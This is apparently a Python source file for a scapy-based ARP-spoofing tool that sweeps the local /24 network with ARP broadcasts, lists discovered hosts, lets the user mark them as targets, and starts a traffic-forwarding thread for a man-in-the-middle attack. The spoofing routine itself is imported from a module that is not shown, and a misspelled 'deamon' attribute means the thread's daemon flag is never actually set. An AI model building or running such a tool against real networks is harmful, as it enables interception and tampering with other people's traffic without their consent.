from scapy.all import *
from scapy.layers.l2 import *
import config
from arp import *
from config import *

def scan_network(ip_range):
    network_devices.clear()
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    result = srp(packet, timeout=3, verbose=0)[0]
    for sent, received in result:
        network_devices.append({"ip" : received.psrc, "mac" : received.hwsrc})


def list_network(args=None):
    scan_network(ip_range=".".join(config.gateway_ip.split(".")[:3]) + ".0" + "/24")
    for index, device in enumerate(network_devices):
        if device in targets:
            print(str(index) + ".  [V] " + device["ip"] + " : " + device["mac"])
        else:
            print(str(index) + ". " + device["ip"] + " : " + device["mac"])

def set_target(args):
    if len(args) != 1 or not args[0].isdigit() or int(args[0]) >= len(network_devices):
        print("Error! Set target to device's index. (Please look at list_network command)")
        return None
    else:
        targets.append(network_devices[int(args[0])])
        return targets

def show_targets(args):
    for target in targets:
        print(target)

def arp_spoof(args):
    forwading_thread = threading.Thread(target=enable_forwarding, args=(gateway_mac, my_mac))
    forwading_thread.deamon = True
    forwading_thread.start()
